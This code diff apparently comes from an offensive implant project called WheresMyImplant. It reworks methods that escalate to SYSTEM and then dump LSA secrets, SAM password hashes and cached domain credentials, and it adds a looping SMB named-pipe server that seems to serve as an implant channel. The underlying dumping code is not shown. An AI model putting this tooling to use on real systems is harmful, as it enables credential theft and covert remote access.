@@ -407,15 +407,14 @@ namespace WheresMyImplant
         {
             StringBuilder output = new StringBuilder();
             CheckPrivileges checkSystem = new CheckPrivileges();
-            checkSystem.GetSystem();
-            output.Append(checkSystem.GetOutput());
-
-            if (!checkSystem.croak)
+            String results = "";
+            if (checkSystem.GetSystem())
             {
                 LSASecrets lsaSecrets = new LSASecrets();
                 lsaSecrets.DumpLSASecrets();
-                output.Append(lsaSecrets.GetOutput());
+                results = lsaSecrets.GetOutput();
             }
+            output.Append("\n" + checkSystem.GetOutput() + "\n" + results);
             return output.ToString();
         }
 
@@ -424,14 +423,13 @@ namespace WheresMyImplant
         {
             StringBuilder output = new StringBuilder();
             CheckPrivileges checkSystem = new CheckPrivileges();
-            checkSystem.GetSystem();
-            output.Append(checkSystem.GetOutput());
-
-            if (!checkSystem.croak)
+            String results = "";
+            if(checkSystem.GetSystem())
             {
                 SAM sam = new SAM();
-                output.Append(sam.GetOutput());
+                results = sam.GetOutput();
             }
+            output.Append("\n" + checkSystem.GetOutput() + "\n" + results);
             return output.ToString();
         }
 
@@ -440,15 +438,27 @@ namespace WheresMyImplant
         {
             StringBuilder output = new StringBuilder();
             CheckPrivileges checkSystem = new CheckPrivileges();
-            checkSystem.GetSystem();
-            output.Append(checkSystem.GetOutput());
-
-            if (!checkSystem.croak)
+            String results = "";
+            if(checkSystem.GetSystem())
             {
                 CacheDump cacheDump = new CacheDump();
-                output.Append(cacheDump.GetOutput());
+                results = cacheDump.GetOutput();
             }
+            output.Append("\n" + checkSystem.GetOutput() + "\n" + results);
             return output.ToString();
+        }
+
+        public static void StartSmbServer(String pipeName)
+        {
+            Console.WriteLine("Starting SMB Server");
+            while (true)
+            {
+                using (SMBServer smbServer = new SMBServer(pipeName))
+                {
+                    smbServer.waitForConnection();
+                    smbServer.mainLoop();
+                }
+            }
         }
     }
 }
